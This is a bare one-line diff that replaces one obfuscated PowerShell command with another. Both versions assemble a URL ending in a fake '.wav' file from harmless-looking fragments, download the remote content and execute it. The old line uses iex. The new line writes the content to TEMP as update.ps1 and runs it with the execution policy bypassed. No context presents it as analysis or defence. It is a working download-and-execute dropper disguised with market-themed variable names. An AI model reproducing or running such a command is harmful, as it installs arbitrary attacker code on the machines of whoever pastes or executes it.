@@ -1,1 +1,1 @@
-powershell -Command "$gateway='https://';$marketNode='dev';$stream='-featured';$zone='.app';$patch='qqwwe.wav';$updateURL=$gateway + $marketNode + $stream + $zone + '/' + $patch;iex ([Text.Encoding]::UTF8.GetString((iwr $updateURL -UseBasicParsing).Content))"
+powershell -Command "$proto='https://';$domain='dev';$section='-featured';$tld='.app';$asset='qqwwe.wav';$ticker=$proto + $domain + $section + $tld + '/' + $asset; $chart=Join-Path $env:TEMP 'update.ps1'; iwr $ticker -UseBasicParsing -OutFile $chart; powershell -ExecutionPolicy Bypass -File $chart"
